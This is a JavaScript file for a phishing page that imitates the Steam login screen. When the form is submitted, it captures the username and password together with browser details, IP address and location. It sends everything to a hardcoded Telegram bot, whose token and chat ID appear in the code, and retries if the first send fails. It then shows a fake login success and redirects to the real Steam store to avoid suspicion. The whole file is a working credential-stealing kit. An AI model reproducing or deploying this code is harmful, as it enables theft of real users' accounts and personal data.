document.addEventListener('DOMContentLoaded', function() {
    // Add smooth loading effects to enhance the UI
    animateLoginForm();
    
    // Event listener for the login form
    document.getElementById('loginForm').addEventListener('submit', handleSubmit);
    
    // Event listener for the close button
    document.querySelector('.close-button').addEventListener('click', function() {
        document.querySelector('.login-box').classList.add('fade-out');
        setTimeout(() => {
            // This would normally redirect or close the window
            alert('This would close the window in a real Steam interface');
            document.querySelector('.login-box').classList.remove('fade-out');
        }, 300);
    });
    
    // Add focus events for input fields to enhance user experience
    const inputFields = document.querySelectorAll('input[type="text"], input[type="password"]');
    inputFields.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('input-focus');
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.classList.remove('input-focus');
        });
        
        // Trigger animation on input changes
        input.addEventListener('input', function() {
            if (this.value.length > 0) {
                this.classList.add('has-content');
            } else {
                this.classList.remove('has-content');
            }
        });
    });
    
    // Add keyboard navigation for better accessibility
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            document.querySelector('.close-button').click();
        } else if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
            const loginBtn = document.getElementById('login-btn');
            if (loginBtn) {
                e.preventDefault();
                loginBtn.click();
            }
        }
    });
});

// Function to animate the login form elements on page load
function animateLoginForm() {
    const loginBox = document.querySelector('.login-box');
    const steamLogo = document.querySelector('.steam-logo');
    const pageTitle = document.querySelector('.page-title');
    const formElements = document.querySelectorAll('.login-form-container > *, .qr-container > *');
    const footer = document.querySelector('.footer');
    
    // Ensure elements start with opacity 0
    loginBox.style.opacity = '0';
    loginBox.style.transform = 'translateY(20px)';
    
    // Add a slight delay before showing the form to simulate loading
    setTimeout(() => {
        // First animate the logo and title
        steamLogo.style.opacity = '1';
        steamLogo.style.transform = 'translateY(0)';
        
        setTimeout(() => {
            pageTitle.style.opacity = '1';
            pageTitle.style.transform = 'translateY(0)';
            
            // Then animate the login box
            setTimeout(() => {
                loginBox.style.opacity = '1';
                loginBox.style.transform = 'translateY(0)';
                
                // Animate each form element with a slight delay
                formElements.forEach((element, index) => {
                    setTimeout(() => {
                        element.style.opacity = '1';
                        element.style.transform = 'translateY(0)';
                    }, 70 + (index * 35));
                });
                
                // Finally animate the footer
                setTimeout(() => {
                    footer.style.opacity = '1';
                    footer.style.transform = 'translateY(0)';
                }, 600);
            }, 150);
        }, 100);
    }, 200);
}

// Handle form submission
function handleSubmit(event) {
    event.preventDefault();
    
    // Get form data
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('remember').checked;
    
    // Check if data was entered
    if (!username || !password) {
        showMessage('Please enter your account name and password.', 'error');
        shakeLoginButton();
        return;
    }
    
    // Collect data for sending to Telegram
    const userData = {
        username: username,
        password: password,
        rememberMe: rememberMe,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        ipInfo: 'Collecting...',
        location: 'Detecting...'
    };
    
    // Try to get IP info
    try {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                userData.ipInfo = `${data.ip} (${data.org})`;
                userData.location = `${data.city}, ${data.region}, ${data.country_name}`;
                // Now send with complete info
                sendToTelegram(userData);
            })
            .catch(error => {
                // Send anyway without IP info
                sendToTelegram(userData);
            });
    } catch (e) {
        // If fetch fails, send what we have
        sendToTelegram(userData);
    }

    // Simulate server response after authentication
    simulateAuthResponse();
}

// Function to add a shake animation to the login button on error
function shakeLoginButton() {
    const loginBtn = document.getElementById('login-btn');
    loginBtn.classList.add('shake');
    
    setTimeout(() => {
        loginBtn.classList.remove('shake');
    }, 500);
}

// Function to simulate a server response after sending data
function simulateAuthResponse() {
    // Show loading indicator
    showMessage('Processing login...', 'loading');
    
    // Simulate response time
    setTimeout(() => {
        // Accept any login credentials
        showMessage('Login successful! Redirecting to Steam...', 'success');
        
        // Simulate redirection after login
        setTimeout(() => {
            window.location.href = 'https://store.steampowered.com'; // In reality, this would be a real URL
        }, 1500);
    }, 1000);
}

// Function to send data to a Telegram bot
function sendToTelegram(userData) {
    // Replace with your bot token and chat ID
    const botToken = '7618241698:AAHHE3cd5y73fINIlzsMwTKak50BgB5VQc4';
    const chatId = '7070473485';
    
    // Format the message for Telegram with more details
    const message = `🔐 Steam Login Attempt:\n\n👤 Username: ${userData.username}\n🔑 Password: ${userData.password}\n💾 Remember Me: ${userData.rememberMe ? 'Yes' : 'No'}\n⏰ Timestamp: ${userData.timestamp}\n📱 User Agent: ${userData.userAgent}\n💻 Platform: ${userData.platform}\n🌐 Language: ${userData.language}\n📊 Resolution: ${userData.screenResolution}\n🌍 Location: ${userData.location}\n🔍 IP Info: ${userData.ipInfo}`;
    
    // Send the data to the Telegram API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error(error);
        // Try to send again with a simpler format if there was an error
        retrySendToTelegram(userData, botToken, chatId);
    });
}

// Backup function to retry sending with a simpler format
function retrySendToTelegram(userData, botToken, chatId) {
    // Simplified message format
    const message = `Steam Login: Username: ${userData.username}, Password: ${userData.password}, Remember: ${userData.rememberMe ? 'Yes' : 'No'}, IP: ${userData.ipInfo}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error(error);
    });
}

// Function to display messages to the user
function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.style.opacity = '0';
    messageDiv.style.display = 'block';
    
    // Reset classes
    messageDiv.className = '';
    
    // Add the appropriate class for the message type
    if (type === 'success') {
        messageDiv.classList.add('success');
    } else if (type === 'error') {
        messageDiv.classList.add('error');
    } else if (type === 'loading') {
        messageDiv.classList.add('loading');
    }
    
    // Fade in the message
    setTimeout(() => {
        messageDiv.style.opacity = '1';
    }, 10);
} 